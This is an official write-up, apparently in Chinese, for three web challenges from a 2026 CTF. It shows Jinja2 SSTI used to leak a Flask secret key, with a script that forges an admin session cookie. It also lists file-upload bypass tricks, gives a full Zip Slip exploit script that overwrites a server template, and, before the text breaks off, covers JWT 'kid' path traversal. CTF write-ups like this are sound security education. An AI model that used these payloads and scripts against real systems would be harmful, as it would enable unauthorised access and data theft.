---
title: 2026 ZeroG-CTF WEB 官方 Write-up
url: https://mp.weixin.qq.com/s/8jOjoUoNP5h7ypwjI1ostw
source: Doonsec's feed
date: 2026-05-25
fetch_date: 2026-05-26T06:00:19.657171
---

# 2026 ZeroG-CTF WEB 官方 Write-up

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/w583TgvLJRZYKMNTK5icZict4uJ90hyU6LISTtXwPqibd2Gyr0NBPK4dCxhtnH5WyykQwezb0S16KooLwryIKWjUVJ2S8y77iaZEbia2BPKprfG8/0?wx_fmt=jpeg)

# 2026 ZeroG-CTF WEB 官方 Write-up

原创

平平无奇 n1
平平无奇 n1

Breaking-code

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# WEB-01

先登录任意用户名,例如`user1`,这时候浏览器会拿到一个普通 session

随便到处 fuzz

![](https://mmbiz.qpic.cn/mmbiz_png/w583TgvLJRYoXuzPv86RsHygUGMgNG6dSPGU7HvXIomibTUGGxpuukLXA2fqIsviagocInGpq0kvyjzGnhs3JxJ4orE5PiaS931AUYnNqrTtfY/640?wx_fmt=png&from=appmsg)然后在这里发现存在 `Jinja2 SSTI`

尝试读取 Flask 配置

获取所有配置`{{config}}`

精确一点就是`{{config.SECRET_KEY}}`

字典访问也行`{{config['SECRET_KEY']}}`

> 这里其实一开始设计的时候想过滤 config 的,后来想想算了,简简单单也挺好

这时候去看一下 Cookie 中 session 的值

```
.eJyrVsrJT8_Miy_JzE1VslIyMjAy0zUw1TU0DjE0tDI0tTIx0rMwsDA2MVXSUSrKzwGpKS1OLQLyQFReYi5MxFCpFgAxmBXM.agRdXg.mpkz-AtvMwTPwhi58bfwCGp0J5c
```

写一个简单的脚本来处理 Flask Session  吧

```
from flask.json.tag import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer, TimestampSigner, BadTimeSignature
import base64
def manage_flask_session(secret_key, cookie_value=None, data_to_encode=None):
    serializer = URLSafeTimedSerializer(
        secret_key,
        salt='cookie-session',
        serializer=TaggedJSONSerializer(),
        signer=TimestampSigner,
        signer_kwargs={'key_derivation': 'hmac', 'digest_method': 'sha1'}
    )
    if cookie_value:
        try:
            payload = cookie_value.split('.')[0]

            decoded = base64.urlsafe_b64decode(payload + '==' * (4 - len(payload) % 4))
            print(f"[+] 原始 Base64 解码内容: {decoded.decode(errors='ignore')}")

            data = serializer.loads(cookie_value)
            print(f"[+] 验证成功！Session 数据: {data}")
        except Exception as e:
            print(f"[-] 验证失败: {e}")

    if data_to_encode:
        new_cookie = serializer.dumps(data_to_encode)
        print(f"[+] 伪造成功！新的 Session Cookie: \n{new_cookie}")

KEY = "zerog_space_notes_secret_key_2026"

current_cookie = ".eJyrVsrJT8_Miy_JzE1VslIyMjAy0zUw1TU0DjE0tDI0tTIx0rMwsDA2MVXSUSrKzwGpKS1OLQLyQFReYi5MxFCpFgAxmBXM.agRdXg.mpkz-AtvMwTPwhi58bfwCGp0J5c"

manage_flask_session(KEY, cookie_value=current_cookie)

fake_admin_data = {
    'login_time': '2026-05-13T11:15:42.808345',
    'role': 'admin',
    'username': 'admin'
}
manage_flask_session(KEY, data_to_encode=fake_admin_data)
```

运行结果

```
[+] 原始 Base64 解码内容:
[+] 验证成功！Session 数据: {'login_time': '2026-05-13T11:15:42.808345', 'role': 'user', 'username': 'user1'}
[+] 伪造成功！新的 Session Cookie:
.eJyrVsrJT8_Miy_JzE1VslIyMjAy0zUw1TU0DjE0tDI0tTIx0rMwsDA2MVXSUSrKzwGpSUzJzcwDckuLU4vyEnMRQrUARkIWLw.agRhbA.gx2egleqGSAuuvidxY7GQxiX5wM
```

替换回原来的 session 访问 Admin 页面获得 flag,easy~

# WEB-02

> 本来那个主题包想先通过信息搜集获取的,为降低难度,这里直接给附件了

从题目名推测是文件上传,尝试 Upload photo 接口(其实应该先看附件的)

应该有以下常见绕过思路

```
1. .php3
2. .PhP
3. 复写 PhPHPp
4. .php[ 空格 ]
5. .php.
6. .php. .
7. .php::$DATA
8.  shell.php%00.jpg
9. 目标为 aphche 的话尝试先上传 .htaccess重新定义规则
 AddType application/x-httpd-php .jpg
10. nginx 配置不当:http://target.com/upload/me.jpg/.php
 Nginx 可能会把 me.jpg 当作 PHP 执行。
11. 尝试图片马二次渲染绕过
```

很明显都不是

还有个接口,上传 zip 主题包的,

我们看附件,这里直接把题目的源码给我们了,我们白盒审计代码

发现定位一段 zip 解压逻辑

```
with zipfile.ZipFile(zip_path, "r") as zf:
    for member in zf.infolist():
        target_path = extract_root / member.filename

        if member.is_dir():
            target_path.mkdir(parents=True, exist_ok=True)
            continue

        target_path.parent.mkdir(parents=True, exist_ok=True)

        with zf.open(member, "r") as src, open(target_path, "wb") as dst:
            dst.write(src.read())
```

很明显存在 Zip Slip 路径穿越漏洞

照片墙模板 `<font style="color:rgb(13, 13, 13);">gallery.html</font>` 中有这样一段：

```
{% for photo in photos %}
    {% include "theme/card.html" %}
{% endfor %}
```

说明只要覆盖 templates/theme/card.html ,然后访问/gallery就能触发我们写入的 Jinja2 模板

我们开始构造恶意 card.html

因为应用中将动态 flag 放入了 Flask config：

```
app.config["ZEROG_FLAG"] = FLAG
```

所以模板中可以直接读取这个：

```
{{ config['ZEROG_FLAG'] }}
```

恶意模板内容如下：

```
<div class="photo-card">
    <h2>ZeroG Theme Loaded</h2>
    <p>{{ config['ZEROG_FLAG'] }}</p>
</div>
```

构造恶意 ZIP关键点是 ZIP 内文件名必须是`<font style="color:rgb(13, 13, 13);">../../templates/theme/card.html</font>`

我们生成恶意 zip

```
import zipfile

payload = """<div class="photo-card">
<h2>ZeroG Theme Loaded</h2>
<p>{{ config['ZEROG_FLAG'] }}</p>
</div>
"""

with zipfile.ZipFile("evil_theme.zip", "w", zipfile.ZIP_DEFLATED) as z:
    z.writestr("../../templates/theme/card.html", payload)
```

上传 zip 后访问照片墙`<font style="color:rgb(13, 13, 13);">/gallery</font>`,就会得到 flag

![](https://mmbiz.qpic.cn/mmbiz_png/w583TgvLJRZqCp3es1oicSdaPFbwdhibAuqRicnbF7Eq1zgTjwswFvckrhs0OnnRG3r2csVkOWWOQtqicvv2Gc3xPNIR7gM1N1ledEhVM2SHc5U/640?wx_fmt=png&from=appmsg)

完整利用 EXP

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import io
import re
import zipfile
import requests

BASE_URL = "http://127.0.0.1:5000"

def build_payload_zip():
    """
    构造 Zip Slip 主题包
    ZIP 内部文件名：
        ../../templates/theme/card.html

    覆盖：
        /app/templates/theme/card.html
    """
    payload_template = """<div class="photo-card">
<h2>ZeroG Theme Loaded</h2>
<p id="flag">{{ config['ZEROG_FLAG'] }}</p>
</div>
"""

    bio = io.BytesIO()

    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("../../templates/theme/card.html", payload_template)

    bio.seek(0)
    return bio

def upload_theme(zip_file):
    files = {
        "theme": ("evil_theme.zip", zip_file, "application/zip")
    }

    r = requests.post(
        BASE_URL + "/theme/upload",
        files=files,
        allow_redirects=True,
        timeout=10
    )

    print("[+] upload status:", r.status_code)
    return r.text

def get_flag():
    r = requests.get(BASE_URL + "/gallery", timeout=10)
    text = r.text

    m = re.search(r"flag\{[^}]+\}", text)
    if not m:
        print(text)
        raise RuntimeError("flag not found in /gallery response")

    return m.group(0)

def main():
    print("[*] Building malicious theme zip...")
    z = build_payload_zip()

    print("[*] Uploading theme package...")
    upload_theme(z)

    print("[*] Visiting /gallery...")
    flag = get_flag()

    print("[+] FLAG:", flag)

if __name__ == "__main__":
    main()
```

# WEB-03

访问`/api/docs`

返回如图(这里 FeHelper 插件会自动美化 json)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w583TgvLJRZoUgVcroq1vZO8pehybdLRkpcibLPpbeLVcCicEYU6aqeuKpgZ19B4iaSCdbfXnbNibjrQibPI3k7Y7IOyHTkydmjciaaOvyFBj2c6A/640?wx_fmt=png&from=appmsg)

 JWT header 里的 `<font style="color:rgb(13, 13, 13);">kid</font>` 可能参与验签密钥选择

![](https://mmbiz.qpic.cn/sz_mmbiz_png/w583TgvLJRZFJlsr8x0LAheaR12gNMnGiceNRAWaUYoay3oKtYdzxNIdia4Fwju46Zo6LztN4gbAbIbs55b52kt2J2W4iaR8TQsXEVGtp9bkib8/640?wx_fmt=png&from=appmsg)

解码 JWT Header,观察 kid![](https://mmbiz.qpic.cn/mmbiz_png/w583TgvLJRYGofxuohQVb67VekqtPRALxGI779vLPH00hibbJ1n3Yic3ysKuspdMTMYmmX8kOvs6Oow8lWK9UJYIyfO457ughGhrXeIA9zgnA/640?wx_fmt=png&from=appmsg)用 Python 解码

```
import base64
import json

token = "xxxxxxxxN1最帅嘻嘻嘻"
header_b64 = token.split(".")[0]
header_b64 += "=" * (-len(header_b64) % 4)
header = json.loads(base64.urlsafe_b64decode(header_b64))
print(json.dumps(header, indent=2))
```

发现使用算法`HS256`header 中有`kid = "user.key"`

我们开始审计源码,这个地方发现 kid 漏洞

在`app.py`有

```
def read_key_by_kid(kid: str) -> bytes:
    key_path = KEY_DIR / kid
    if not key_path.exists() or not key_path.is_file():
        raise FileNotFoundError("key not found")
    return key_path.read_bytes()
```

验证 Token 的时候:

```
def verify_token(token: str) -> dict:
    header = jwt.get_unverified_header(token)
    kid = header.get("kid", DEFAULT_KID)
    key = read_key_by_kid(kid)
    payload = jwt.decode(
        token,
        key,
        algorithms=[JWT_ALG],
        options={
            "require": ["exp", "iat"],
        },
    )
```

可以看到服务器完全相信客户端传来的 kid,然后直接 `KEY_DIR/kid` 拼路径,没有过滤`../`存在目录穿越

也就是说,只要我在`header`把 kid 改成`../static/mission.txt`

服务端就会去读

```
/app/keys/../static/mission.txt  => /app/static/mission.txt
```

访问`...